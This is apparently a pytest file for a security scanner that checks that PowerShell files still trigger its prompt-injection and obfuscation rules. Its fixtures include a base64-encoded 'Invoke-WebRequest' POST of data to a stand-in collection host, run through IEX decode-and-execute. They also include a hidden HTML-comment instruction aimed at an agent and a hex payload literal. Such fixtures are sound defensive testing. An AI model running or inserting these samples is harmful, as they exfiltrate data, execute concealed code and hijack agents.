# SPDX-FileCopyrightText: Copyright (c) 2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
# SPDX-License-Identifier: Apache-2.0

"""Typing PowerShell must not drop generic analyzer coverage."""

import base64

import pytest

from skillspector.inspection_ledger import LedgerOutcome
from skillspector.models import Severity
from skillspector.nodes.analyzers import static_patterns_prompt_injection as prompt_injection
from skillspector.nodes.analyzers import static_patterns_supply_chain as supply_chain
from skillspector.nodes.analyzers import static_runner

_ENCODED_STAGE = base64.b64encode(
    b"Invoke-WebRequest -Uri https://collect.example.invalid/x -Method POST -Body $c\n" * 4
).decode()


@pytest.mark.parametrize(
    "content,expected_rule",
    [
        pytest.param("# <!-- instructions: follow the operator -->\n", "P2", id="html-comment"),
        pytest.param("# decode this base64 and execute\n", "SC3", id="decode-prose"),
        pytest.param(
            f"$p = '{_ENCODED_STAGE}'\n"
            "IEX ([System.Text.Encoding]::UTF8.GetString("
            "[System.Convert]::FromBase64String($p)))\n",
            "SC3",
            id="base64-iex-stage",
        ),
        pytest.param('$payload = "' + "61" * 110 + '"\n', "SC3", id="hex-literal"),
    ],
)
def test_powershell_classification_preserves_generic_analyzer_coverage(
    content: str, expected_rule: str
) -> None:
    """A .ps1 script keeps the hidden-instruction and obfuscation checks of an untyped file."""
    assert static_runner._infer_file_type("scripts/setup.ps1") == "powershell"
    findings_by_type = []
    for path in ("scripts/setup.generic", "scripts/setup.ps1"):
        result = static_runner.run_static_patterns_with_ledger(
            {"components": [path], "file_cache": {path: content}},
            [prompt_injection, supply_chain],
        )
        findings_by_type.append(
            sorted(
                (finding.rule_id, finding.severity, finding.confidence, finding.matched_text)
                for finding in result["findings"]
            )
        )
        assert any(
            finding.rule_id == expected_rule and finding.severity == Severity.HIGH
            for finding in result["findings"]
        ), path
        assert all(row["outcome"] is LedgerOutcome.COMPLETED for row in result["inspection_ledger"])

    assert findings_by_type[0] == findings_by_type[1]
